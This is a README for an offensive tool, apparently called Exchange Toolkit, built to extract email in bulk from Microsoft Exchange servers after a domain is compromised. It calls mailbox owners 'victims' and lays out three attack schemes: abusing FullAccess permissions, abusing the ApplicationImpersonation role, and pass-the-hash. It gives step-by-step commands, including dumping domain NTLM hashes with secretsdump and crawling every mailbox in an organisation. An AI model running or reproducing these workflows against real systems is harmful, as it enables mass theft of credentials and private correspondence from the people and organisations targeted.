# Exchange Toolkit

A pure-Python toolkit for bulk email extraction from on-premises Microsoft Exchange servers, designed for post-exploitation scenarios where Domain Admin or Exchange Administrator credentials are already available.

---

## Table of Contents

- [Exchange Toolkit](#exchange-toolkit)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Requirements](#requirements)
    - [Python Dependencies](#python-dependencies)
  - [Installation](#installation)
  - [Architecture](#architecture)
  - [Three Access Schemes](#three-access-schemes)
    - [Scheme A — Delegate + FullAccess](#scheme-a--delegate--fullaccess)
    - [Scheme B — EWS Impersonation](#scheme-b--ews-impersonation)
    - [Scheme C — Pass-the-Hash](#scheme-c--pass-the-hash)
  - [Configuration](#configuration)
    - [Structure](#structure)
    - [Account Fields](#account-fields)
  - [CLI Reference](#cli-reference)
    - [enum-mailboxes](#enum-mailboxes)
    - [grant-access](#grant-access)
    - [grant-impersonation](#grant-impersonation)
    - [gen-config](#gen-config)
    - [run](#run)
    - [check](#check)
    - [list](#list)
  - [Module Reference](#module-reference)
    - [core/ntlm\_auth.py](#corentlm_authpy)
    - [core/exchange\_admin.py](#coreexchange_adminpy)
      - [`ExchangeAdminSession`](#exchangeadminsession)
      - [`LdapMailboxEnumerator`](#ldapmailboxenumerator)
    - [core/ntds\_helper.py](#corentds_helperpy)
  - [Typical Workflows](#typical-workflows)
    - [SchemeA — FullAccess Delegate](#schemea--fullaccess-delegate)
    - [SchemeB — EWS Impersonation](#schemeb--ews-impersonation)
    - [SchemeC — Pass-the-Hash](#schemec--pass-the-hash)

---

## Overview

Exchange Toolkit automates the extraction of emails via the Exchange Web Services (EWS) API. Once you hold elevated AD credentials, three exploitation paths are supported:

| Scheme                        | Mechanism                                                             | Prerequisites                                     |
| ----------------------------- | --------------------------------------------------------------------- | ------------------------------------------------- |
| **A — Delegate + FullAccess** | Admin account accesses victim mailbox with FullAccess ACL             | Run `grant-access` to add the ACL                 |
| **B — EWS Impersonation**     | Admin account impersonates any user via ApplicationImpersonation role | Run `grant-impersonation` to assign the RBAC role |
| **C — Pass-the-Hash (PTH)**   | Authenticate directly with NTLM hashes from NTDS dump                 | Obtain NTLM hashes via `secretsdump`              |

Emails are saved locally as `.eml` files, preserving the original folder structure.

---

## Requirements

- Python 3.11+ (Python 3.14 recommended; `tomllib` is built-in from 3.11)
- Exchange on-premises (Exchange 2013 / 2016 / 2019)
- EWS endpoint accessible (`/ews/exchange.asmx`)

### Python Dependencies

```plaintext
exchangelib       # EWS client
requests-ntlm     # NTLM HTTP auth
spnego            # NTLM hash credential support
typer             # CLI framework
rich              # Progress bars
ldap3             # LDAP enumeration
pycryptodome      # NTLM crypto for ldap3
pypsrp            # WinRM / PowerShell Remoting
tomli-w           # TOML writing (gen-config)
```

---

## Installation

```bash
# Create virtual environment
python -m venv .venv
.venv\Scripts\activate          # Windows
# source .venv/bin/activate     # Linux / macOS

# Install dependencies
pip install exchangelib requests-ntlm spnego typer rich ldap3 pycryptodome pypsrp tomli-w
```

---

## Architecture

```plaintext
Exchange-Toolkit/
├── MailCrawler.py          # Main CLI entry point (all commands)
├── config.toml             # Configuration file (accounts + admin block)
├── build.py                # Nuitka packaging script
├── core/
│   ├── __init__.py
│   ├── ntlm_auth.py        # Pass-the-Hash EWS authentication
│   ├── exchange_admin.py   # LDAP enumeration + WinRM admin operations
│   └── ntds_helper.py      # secretsdump parser + config generator
└── extract_eml_text.py     # Offline EML text extraction utility
```

---

## Three Access Schemes

### Scheme A — Delegate + FullAccess

The admin account is granted `FullAccess` permission on the victim mailbox via the Exchange ACL. EWS is then accessed in `DELEGATE` mode using the admin's credentials and the victim's primary SMTP address.

**Authentication flow:**

1. `grant-access` executes `Add-MailboxPermission` via Exchange Remote PowerShell (WinRM).
2. `MailCrawler.py run` opens the victim mailbox through EWS with `access_type = delegate`.

### Scheme B — EWS Impersonation

The admin account is assigned the `ApplicationImpersonation` RBAC role, which allows it to impersonate any mailbox in the organisation without individual ACL changes. A single admin account can crawl unlimited mailboxes in one pass.

**Authentication flow:**

1. `grant-impersonation` executes `New-ManagementRoleAssignment -Role ApplicationImpersonation` via WinRM.
2. `MailCrawler.py run` loops over the `targets` list, opening each mailbox with `access_type = impersonation`.

### Scheme C — Pass-the-Hash

NTLM hashes extracted from the domain controller's NTDS database (e.g. via impacket `secretsdump`) are used directly to authenticate to EWS without knowing the plaintext password.

**Authentication flow:**

1. NTLM hash is injected into the HTTP session via `HttpNtlmHashAuth` (wraps `requests-ntlm` with `spnego.NTLMHash` credentials).
2. EWS requests proceed identically to password-based authentication from the Exchange server's perspective.

---

## Configuration

The configuration file is `config.toml`. Use `--config` / `-c` to specify an alternate path.

### Structure

```toml
[crawler]
days       = 3          # Look-back window in days (0 = no limit)
output_dir = "eml_exports"
log_file   = "email_crawler.log"

[admin]
username        = "DOMAIN\\admin"
password        = "P@ssw0rd"
exchange_server = "mail.example.com"
# ssl        = true
# ssl_verify = false
# auth       = "negotiate"   # negotiate / ntlm / basic / kerberos

# Scheme A — Delegate
["accounts"."victim@example.com"]
email_address   = "victim@example.com"
username        = "DOMAIN\\admin"
password        = "P@ssw0rd"
exchange_server = "mail.example.com"

# Scheme B — Impersonation (one admin entry, multiple targets)
["accounts"."admin_impersonation"]
email_address   = "admin@example.com"
username        = "DOMAIN\\admin"
password        = "P@ssw0rd"
exchange_server = "mail.example.com"
access_type     = "impersonation"
targets         = ["user1@example.com", "user2@example.com"]
# targets_file  = "mailboxes.txt"   # one address per line

# Scheme C — Pass-the-Hash
["accounts"."user3@example.com"]
email_address   = "user3@example.com"
username        = "DOMAIN\\user3"
ntlm_hash       = "8846f7eaee8fb117ad06bdd830b7586c"   # NT hash (32 hex) or LM:NT
exchange_server = "owa.example.com"
```

### Account Fields

| Field             | Required   | Description                              |
| ----------------- | ---------- | ---------------------------------------- |
| `email_address`   | Yes        | Primary SMTP of the target mailbox       |
| `username`        | Yes        | `DOMAIN\user` format                     |
| `password`        | Scheme A/B | Plaintext password                       |
| `ntlm_hash`       | Scheme C   | 32-char NT hash or `LM:NT` format        |
| `exchange_server` | Yes (PTH)  | EWS server hostname or IP                |
| `access_type`     | No         | `delegate` (default) or `impersonation`  |
| `targets`         | Scheme B   | Inline list of victim addresses          |
| `targets_file`    | Scheme B   | Path to a file with one address per line |

---

## CLI Reference

### enum-mailboxes

Enumerate all mailbox-enabled AD users via LDAP NTLM authentication. Works from non-domain-joined machines; does not require access to the Exchange Remote PowerShell endpoint.

**How it works:** Binds to the domain controller over LDAP (port 389) using NTLM. Searches for user objects where `msExchMailboxGuid` is set. Primary SMTP is read from `proxyAddresses` (`SMTP:` prefix = primary), with `mail` attribute as fallback.

```shell
python MailCrawler.py enum-mailboxes [OPTIONS]
```

| Option              | Default               | Description                                                                                                   |
| ------------------- | --------------------- | ------------------------------------------------------------------------------------------------------------- |
| `--server` / `-s`   | —                     | Exchange server / DC hostname or IP                                                                           |
| `--dc`              | same as `--server`    | Explicit DC hostname for LDAP (if different from Exchange)                                                    |
| `--domain` / `-d`   | derived from username | Domain name (e.g. `randark.local`)                                                                            |
| `--username` / `-u` | from config           | Admin SAMAccountName (`DOMAIN\user` or bare)                                                                  |
| `--password` / `-p` | from config           | Admin password                                                                                                |
| `--ldap-port`       | `389`                 | LDAP port (use `636` for LDAPS)                                                                               |
| `--base-dn`         | auto-derived          | LDAP search base (e.g. `DC=randark,DC=local`)                                                                 |
| `--user-only`       | `false`               | Filter out system mailboxes (HealthMailbox, SystemMailbox, DiscoverySearchMailbox, FederatedEmail, Migration) |
| `--output` / `-o`   | stdout                | Output file path (one address per line)                                                                       |
| `--config` / `-c`   | `config.toml`         | Config file path                                                                                              |

**Examples:**

```bash
# Print all mailboxes to stdout
python MailCrawler.py enum-mailboxes --server 192.168.1.10 --username "randark.local\Administrator" --password "P@ssw0rd"

# Save user-only mailboxes to a file
python MailCrawler.py enum-mailboxes --server 192.168.1.10 --username "randark.local\Administrator" --password "P@ssw0rd" --user-only -o mailboxes.txt
```

---

### grant-access

Grant `FullAccess` on one or more target mailboxes to the admin account via Exchange Remote PowerShell (WinRM). Required for Scheme A.

**How it works:** Connects to the Exchange PowerShell virtual directory (`/powershell`) over WinRM using `pypsrp`. Executes `Add-MailboxPermission -Identity <target> -User <trustee> -AccessRights FullAccess`.

```shell
python MailCrawler.py grant-access [TARGETS...] [OPTIONS]
```

| Option                  | Description                                            |
| ----------------------- | ------------------------------------------------------ |
| `TARGETS`               | Target mailbox addresses (positional, space-separated) |
| `--targets-file` / `-f` | File with target addresses (one per line)              |
| `--all`                 | Grant on ALL organisation mailboxes                    |
| `--trustee` / `-t`      | Account to receive access (defaults to admin username) |
| `--automapping`         | Enable Outlook auto-mapping                            |
| `--server` / `-s`       | Exchange server                                        |
| `--username` / `-u`     | Admin username                                         |
| `--password` / `-p`     | Admin password                                         |
| `--no-ssl`              | Use HTTP (port 80) instead of HTTPS (port 443)         |
| `--port`                | Override WinRM port                                    |

**Example:**

```bash
python MailCrawler.py grant-access user1@corp.com user2@corp.com --server mail.corp.com --username "CORP\admin" --password "P@ssw0rd"
```

---

### grant-impersonation

Assign the `ApplicationImpersonation` RBAC role to the admin account via Exchange Remote PowerShell. Required for Scheme B.

**How it works:** Executes `New-ManagementRoleAssignment -Role ApplicationImpersonation -User <admin>` on the Exchange server via WinRM/pypsrp.

```shell
python MailCrawler.py grant-impersonation [OPTIONS]
```

Options are identical to `grant-access` (without `TARGETS`, `--trustee`, `--all`, `--targets-file`, `--automapping`).

**Example:**

```bash
python MailCrawler.py grant-impersonation --server mail.corp.com --username "CORP\admin" --password "P@ssw0rd"
```

To revoke the role later:

```bash
python MailCrawler.py grant-impersonation --revoke --server mail.corp.com --username "CORP\admin" --password "P@ssw0rd"
```

---

### gen-config

Generate a `config.toml` accounts section from an impacket `secretsdump` NTLM dump and a mailbox list. Matches usernames to mailboxes by SAMAccountName and outputs ready-to-use PTH entries (Scheme C).

```shell
python MailCrawler.py gen-config NTDS_FILE MAILBOXES_FILE [OPTIONS]
```

| Argument / Option | Description                                                          |
| ----------------- | -------------------------------------------------------------------- |
| `NTDS_FILE`       | Path to secretsdump output (`DOMAIN\user:RID:LM:NT:::` format)       |
| `MAILBOXES_FILE`  | Path to mailbox list (one SMTP per line, e.g. from `enum-mailboxes`) |
| `--server` / `-s` | Exchange server to embed in generated entries                        |
| `--output` / `-o` | Output TOML file path (prints to stdout if omitted)                  |

**Example:**

```bash
# 1. Dump hashes from DC
impacket-secretsdump -just-dc-ntlm DOMAIN/admin@dc.corp.com -outputfile ntds

# 2. Enumerate mailboxes
python MailCrawler.py enum-mailboxes --server mail.corp.com -u "DOMAIN\admin" -p "P@ssw0rd" --user-only -o mailboxes.txt

# 3. Generate config
python MailCrawler.py gen-config ntds.secrets mailboxes.txt --server mail.corp.com -o config.toml

# 4. Run
python MailCrawler.py run
```

---

### run

Crawl and download emails from all (or selected) accounts defined in the config file.

```shell
python MailCrawler.py run [ACCOUNTS...] [OPTIONS]
```

| Option            | Default       | Description                                            |
| ----------------- | ------------- | ------------------------------------------------------ |
| `ACCOUNTS`        | all           | Account keys to crawl (matches `["accounts"."<key>"]`) |
| `--days`          | from config   | Override look-back window                              |
| `--output` / `-o` | from config   | Override output directory                              |
| `--config` / `-c` | `config.toml` | Config file path                                       |

**Example:**

```bash
# Crawl all configured accounts
python MailCrawler.py run

# Crawl specific accounts, last 7 days
python MailCrawler.py run victim@corp.com admin_impersonation --days 7
```

---

### check

Verify EWS connectivity for configured accounts without downloading any emails.

```shell
python MailCrawler.py check [ACCOUNTS...] [OPTIONS]
```

---

### list

List all accounts defined in the configuration file.

```shell
python MailCrawler.py list [OPTIONS]
```

---

## Module Reference

### core/ntlm_auth.py

Implements Pass-the-Hash authentication for EWS via two classes:

**`HttpNtlmHashAuth`** — Subclass of `HttpNtlmAuth` (requests-ntlm). Replaces the password with a `spnego.NTLMHash` credential object containing the raw NT/LM hash bytes. The NTLM handshake (`NEGOTIATE → CHALLENGE → AUTHENTICATE`) proceeds as normal; the hash is used in the `NTResponse` field instead of deriving it from a plaintext password.

**`NTLMHashProtocol`** — Subclass of exchangelib's `Protocol`. Overrides `create_session()` to inject `HttpNtlmHashAuth` into the requests session before any EWS call is made. The `CachingProtocol` cache entry is invalidated after creating the default `Account` object so that `NTLMHashProtocol` is instantiated in its place.

```python
from core.ntlm_auth import HttpNtlmHashAuth, NTLMHashProtocol, _parse_ntlm_hash

nt, lm = _parse_ntlm_hash("8846f7eaee8fb117ad06bdd830b7586c")
auth = HttpNtlmHashAuth(username=r"DOMAIN\user", nt_hash_hex=nt, lm_hash_hex=lm)
```

---

### core/exchange_admin.py

Contains two classes for Exchange administration tasks.

#### `ExchangeAdminSession`

Connects to the Exchange Remote PowerShell endpoint (`/powershell`) over WinRM using `pypsrp`. Executes Exchange Management Shell cmdlets from pure Python without a local PowerShell installation.

> **Note:** The Exchange PowerShell virtual directory often advertises only `Kerberos` authentication, which requires the client to be on a domain-joined machine or to supply an FQDN (not an IP) for SPN resolution. On non-domain machines, Kerberos tickets cannot be obtained. In such environments, use `LdapMailboxEnumerator` for enumeration and configure `ApplicationImpersonation` or FullAccess manually via the Exchange Admin Center.

**Key methods:**

| Method                                    | Exchange Cmdlet                                               |
| ----------------------------------------- | ------------------------------------------------------------- |
| `enum_mailboxes()`                        | `Get-Mailbox -ResultSize Unlimited`                           |
| `grant_fullaccess(target, trustee)`       | `Add-MailboxPermission`                                       |
| `grant_fullaccess_bulk(targets, trustee)` | Looped `Add-MailboxPermission`                                |
| `grant_impersonation(admin)`              | `New-ManagementRoleAssignment -Role ApplicationImpersonation` |
| `revoke_impersonation(admin)`             | `Remove-ManagementRoleAssignment`                             |
| `list_mailbox_permissions(target)`        | `Get-MailboxPermission`                                       |

#### `LdapMailboxEnumerator`

Enumerates Exchange mailboxes by querying Active Directory over LDAP using NTLM authentication (via `ldap3` + `pycryptodome`). Does not require PowerShell, WinRM, or Kerberos — works from any non-domain-joined machine with network access to the DC on port 389.

**Detection logic:** Searches for AD user objects matching the filter `(&(objectClass=user)(msExchMailboxGuid=*))`. Any user with `msExchMailboxGuid` set is mailbox-enabled. Primary SMTP is extracted from `proxyAddresses` (entry starting with `SMTP:` in uppercase is the primary address), falling back to the `mail` attribute.

```python
from core.exchange_admin import LdapMailboxEnumerator

enumerator = LdapMailboxEnumerator(
    dc_host="192.168.1.10",
    domain="randark.local",
    username="Administrator",
    password="P@ssw0rd",
)
mailboxes = enumerator.enum_mailboxes()
enumerator.close()
```

---

### core/ntds_helper.py

Utilities for processing impacket `secretsdump` output.

**`parse_secretsdump_output(filepath)`** — Parses lines in `DOMAIN\user:RID:LM:NT:::` format using a regex. Returns a dict keyed by lowercased `domain\username` with `rid`, `lm`, `nt`, `username`, and `domain` fields.

**`find_hash_for_mailbox(hash_map, smtp_address)`** — Attempts to match a mailbox SMTP address to a hash entry by comparing the local part of the address against SAMAccountNames in the hash map.

**`build_accounts_config(hash_map, mailbox_list, exchange_server)`** — Cross-references hash entries against a list of SMTP addresses. Returns a dict of account entries ready to be serialised into `config.toml` using `tomli_w`.

---

## Typical Workflows

### SchemeA — FullAccess Delegate

```shell
# Step 1: Enumerate target mailboxes
python MailCrawler.py enum-mailboxes -s mail.corp.com -u "CORP\admin" -p "Pass" --user-only -o mailboxes.txt

# Step 2: Grant FullAccess on all targets to the admin account
python MailCrawler.py grant-access --targets-file mailboxes.txt -s mail.corp.com -u "CORP\admin" -p "Pass"

# Step 3: Configure config.toml (one delegate entry per target)
# Step 4: Crawl
python MailCrawler.py run --days 30
```

### SchemeB — EWS Impersonation

```shell
# Step 1: Assign ApplicationImpersonation to admin
python MailCrawler.py grant-impersonation -s mail.corp.com -u "CORP\admin" -p "Pass"

# Step 2: Enumerate targets
python MailCrawler.py enum-mailboxes -s mail.corp.com -u "CORP\admin" -p "Pass" --user-only -o mailboxes.txt

# Step 3: Add impersonation entry to config.toml
#   access_type = "impersonation"
#   targets_file = "mailboxes.txt"

# Step 4: Crawl all targets in one pass
python MailCrawler.py run admin_impersonation --days 30
```

### SchemeC — Pass-the-Hash

```shell
# Step 1: Dump hashes from DC (requires DA privileges)
impacket-secretsdump -just-dc-ntlm CORP/admin@dc.corp.com -outputfile ntds

# Step 2: Enumerate mailboxes
python MailCrawler.py enum-mailboxes -s mail.corp.com -u "CORP\admin" -p "Pass" --user-only -o mailboxes.txt

# Step 3: Auto-generate config from hashes + mailbox list
python MailCrawler.py gen-config ntds.secrets mailboxes.txt --server mail.corp.com -o config.toml

# Step 4: Crawl using hashes (no plaintext passwords needed)
python MailCrawler.py run --days 30
```
